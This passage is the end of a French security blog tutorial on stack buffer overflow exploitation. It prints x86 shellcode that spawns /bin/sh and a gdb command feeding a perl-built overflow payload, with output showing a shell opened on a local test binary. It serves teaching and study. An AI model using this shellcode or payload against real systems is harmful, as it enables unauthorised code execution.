class="s2">x31</span><span class="err">\</span><span class="s2">xdb</span><span class="err">\</span><span class="s2">x89</span><span class="err">\</span><span class="s2">xd8</span><span class="err">\</span><span class="s2">x40</span><span class="err">\</span><span class="s2">xcd</span><span class="err">\</span><span class="s2">x80</span><span class="err">\</span><span class="s2">xe8</span><span class="err">\</span><span class="s2">xdc</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xff</span><span class="err">\</span><span class="s2">xff/bin/sh</span><span class="p">"</span>
</code></pre></div></div>

<p>Donc dans gdb, quand on envoie :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> run <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'</span><span class="sb">`</span>

Starting program: /tmp/hackndo/binary <span class="sb">`</span>perl <span class="nt">-e</span> <span class="s1">'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'</span><span class="sb">`</span>
AAAAAAAAAAAAAAAAAAAAP����^�1�F�F
                                �
                                 ���V
                                      ̀1ۉ�@̀�����/bin/sh
process 21429 is executing new program: /bin/dash
<span class="nv">$ </span>
</code></pre></div></div>

<p>Voilà, nous avons également ouvert un shell avec le binaire en exploitant le buffer overflow.</p>

<p>J’ai également enregistré une vidéo avec une exploitation de buffer overflow comme dans le cas 1, vous la <a href="https://www.youtube.com/watch?v=V7Gdc32XRhA" target="blank">trouverez ici</a>.</p>

<p>J’espère que cet article <strong>tuto buffer overflow</strong> vous aura été utile. Des protections contre ce type d’exploitation existent cependant, comme le fait de rendre la pile non exécutable. À ce moment là, pas de panique, vous pouvez toujours récupérer un shell, avec par exemple la technique du <a href="/retour-a-la-libc/">retour à la libc</a>. Have fun !</p>

<p>N’hésitez pas à commenter et partager si vous avez aimé !</p>

  </article>
</div>
<div class="keywords">
    <span class="post-tags"><a href="/archives/#user-land"><i class="fas fa-tags"></i> User Land</a><a href="/archives/#linux"><i class="fas fa-tags"></i> Linux</a></span>
  </div>


<br />
<div class="box">
  <div class="dash">
    <div class="picture">
      <img src="/assets/icones/pixis_logo.png" alt="logo" title="logo" />
    </div>
    <div class="box_content">
      <strong>Auteur</strong> : <a href="/contact/" target="_blank">Pixis</a><br />
      Créateur du blog, suivez-moi sur <a href="https://twitter.com/HackAndDo/" target="_blank">twitter</a> ou <a href="https://discord.gg/9At6SUZ" target="blank">discord</a>
    </div>
    
  </div>
</div>


<div class="related">
  <h2>Articles similaires</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/pass-the-hash/">
            Pass the Hash
            <small>18 Dec 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/remote-lsass-dump-passwords/">
            Extraction des secrets de lsass à distance
            <small>28 Nov 2019</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/bloodhound/">
            BloodHound
            <small>30 Jul 2019</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>

<div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    
    var disqus_config = function () {
        this.page.url = 'http://localhost:4000/buffer-overflow/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = '0000-0000-0000-000B';
    };
    
    (function() {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        
        s.src = '//hackndo.disqus.com/embed.js';
        
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

        </div>
    </main>
    <script src="/assets/js/jquery-2.1.4.js"></script>
    <script src="/assets/js/jquery.menu-aim.js"></script>
    <script src="/assets/js/anchor.min.js"></script>
    <script src="/assets/js/main.js"></script> <!-- Resource jQuery -->
  </body>
</html>